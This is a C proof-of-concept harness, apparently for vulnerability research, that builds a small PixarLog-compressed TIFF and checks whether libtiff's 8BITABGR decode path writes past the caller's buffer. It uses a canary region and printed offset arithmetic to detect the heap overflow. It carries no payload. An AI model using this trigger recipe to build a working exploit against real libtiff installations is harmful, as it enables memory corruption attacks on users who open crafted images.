/*
 * poc_debug.c — Debug the PixarLog 8BITABGR decode path
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tiffio.h>

#define WIDTH   4
#define HEIGHT  3      /* divisible by 3 */
#define SPP     3

static void create_tiff(const char *path)
{
    TIFF *tif = TIFFOpen(path, "w");
    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH,      (uint32_t) WIDTH);
    TIFFSetField(tif, TIFFTAG_IMAGELENGTH,     (uint32_t) HEIGHT);
    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, (uint16_t) SPP);
    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE,   (uint16_t) 8);
    TIFFSetField(tif, TIFFTAG_COMPRESSION,     COMPRESSION_PIXARLOG);
    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC,     PHOTOMETRIC_RGB);
    TIFFSetField(tif, TIFFTAG_PLANARCONFIG,    PLANARCONFIG_CONTIG);
    TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP,    (uint32_t) HEIGHT);
    TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BIT);

    /* Write known pattern: R=0x11, G=0x22, B=0x33 */
    unsigned char row[WIDTH * SPP];
    for (int x = 0; x < WIDTH; x++) {
        row[x*3+0] = 0x11;  /* R */
        row[x*3+1] = 0x22;  /* G */
        row[x*3+2] = 0x33;  /* B */
    }
    for (int y = 0; y < HEIGHT; y++)
        TIFFWriteScanline(tif, row, (uint32_t) y, 0);
    TIFFClose(tif);
}

int main(void)
{
    const char *path = "/tmp/poc_debug.tif";
    create_tiff(path);

    /* Test 1: 8BIT decode */
    {
        TIFF *tif = TIFFOpen(path, "r");
        TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BIT);
        size_t occ = (size_t) SPP * WIDTH * HEIGHT;  /* 3*4*3 = 36 bytes */
        unsigned char *buf = calloc(1, occ + 64);
        memset(buf, 0xAA, occ + 64);
        tmsize_t n = TIFFReadEncodedStrip(tif, 0, buf, (tmsize_t) occ);
        printf("8BIT decode: returned=%lld, buf[0..11]=", (long long)n);
        for (int i = 0; i < 12; i++) printf("%02X ", buf[i]);
        printf("\n");
        TIFFClose(tif);
        free(buf);
    }

    /* Test 2: 8BITABGR decode */
    {
        TIFF *tif = TIFFOpen(path, "r");
        TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BITABGR);
        /* occ for ABGR = 4 bytes/pixel */
        size_t occ = (size_t) 4 * WIDTH * HEIGHT;  /* 4*4*3 = 48 bytes */
        size_t llen = (size_t) SPP * WIDTH;         /* 3*4 = 12 */
        printf("\n8BITABGR decode:\n");
        printf("  occ=%zu llen=%zu nsamples=%zu trim=%zu iters=%zu\n",
               occ, llen, occ, occ % llen, (occ - occ%llen)/llen);
        printf("  expected last_write=[%zu..%zu] buf_end=%zu overflow=%+zd\n",
               ((occ-occ%llen)/llen - 1)*llen,
               ((occ-occ%llen)/llen - 1)*llen + 4*WIDTH - 1,
               occ - 1,
               (ssize_t)(((occ-occ%llen)/llen-1)*llen + 4*WIDTH) - (ssize_t)occ);

        /* Allocate: buf (occ bytes) + canary (64 bytes) in ONE region */
        unsigned char *region = malloc(occ + 64);
        unsigned char *buf    = region;
        unsigned char *canary = region + occ;
        memset(buf,    0x00, occ);
        memset(canary, 0xDE, 64);

        tmsize_t n = TIFFReadEncodedStrip(tif, 0, buf, (tmsize_t) occ);
        printf("  returned=%lld\n", (long long)n);
        printf("  buf[0..15]  = ");
        for (int i = 0; i < 16; i++) printf("%02X ", buf[i]);
        printf("\n  buf[40..47] = ");
        for (int i = 40; i < 48; i++) printf("%02X ", buf[i]);
        printf("\n  canary[0..7]= ");
        for (int i = 0; i < 8; i++) printf("%02X ", canary[i]);
        printf("\n");

        /* Check if canary is corrupted */
        int overwritten = 0;
        for (int i = 0; i < 64; i++) {
            if (canary[i] != 0xDE) { overwritten++; }
        }
        if (overwritten)
            printf("  [!] OVERFLOW: %d canary bytes overwritten!\n", overwritten);
        else
            printf("  canary intact (overflow may be in malloc padding)\n");

        /* Check buffer — did 8BITABGR path run? (A channel = 0 for RGB) */
        int abgr_path = (buf[0] == 0x00);  /* A=0 for RGB */
        printf("  8BITABGR path active: %s (buf[0]=%02X, expected A=0x00)\n",
               abgr_path ? "YES" : "UNKNOWN", buf[0]);

        TIFFClose(tif);
        free(region);
    }

    /* Test 3: Check PIXARLOGDATAFMT value that was actually used */
    {
        TIFF *tif = TIFFOpen(path, "r");
        int fmt = -1;
        /* Try to set ABGR before any read */
        int r = TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BITABGR);
        printf("\nTIFFSetField(PIXARLOGDATAFMT, 8BITABGR) returned: %d\n", r);
        TIFFGetField(tif, TIFFTAG_PIXARLOGDATAFMT, &fmt);
        printf("TIFFGetField(PIXARLOGDATAFMT) = %d (8BITABGR=%d)\n",
               fmt, PIXARLOGDATAFMT_8BITABGR);
        TIFFClose(tif);
    }

    return 0;
}
